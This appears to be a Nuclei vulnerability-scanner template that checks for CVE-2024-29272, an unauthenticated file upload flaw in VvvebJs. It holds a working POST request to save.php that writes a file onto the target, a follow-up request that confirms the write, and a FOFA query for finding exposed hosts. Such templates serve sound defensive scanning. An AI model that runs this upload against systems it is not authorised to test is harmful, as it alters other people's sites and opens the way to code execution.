flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - contains(body,"File saved")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'POST /save.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    file=demo/landing/index.php&html={{md5(num)}}

    '
- matchers:
  - condition: and
    dsl:
    - contains(body,"{{md5(num)}}")
    - status_code == 200
    type: dsl
  raw:
  - 'GET /demo/landing/index.php HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-29272
info:
  author: s4e-io
  classification:
    cpe: cpe:2.3:a:vvvebjs:vvvebjs:1.7.4:*:*:*:*:*:*:*
    cve-id: CVE-2024-29272
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
    cvss-score: 6.5
    cwe-id: CWE-434
    epss-percentile: 0.09538
    epss-score: 0.00043
  description: 'Arbitrary File Upload vulnerability in VvvebJs before version 1.7.5,
    allows unauthenticated remote attackers to execute arbitrary code and obtain sensitive
    information via the sanitizeFileName parameter in save.php.

    '
  metadata:
    fofa-query: icon_hash="524332373"
    max-request: 1
    product: vvvebjs
    vendor: vvvebjs
    verified: true
  name: VvvebJs < 1.7.5 - Arbitrary File Upload
  reference:
  - https://github.com/awjkjflkwlekfdjs/CVE-2024-29272/
  - https://github.com/givanz/VvvebJs/issues/343
  - https://nvd.nist.gov/vuln/detail/CVE-2024-29272
  - https://vuldb.com/?id.257680
  severity: medium
  tags: cve,cve2024,file-upload,intrusive
variables:
  num: '{{rand_int(1000, 9999)}}'
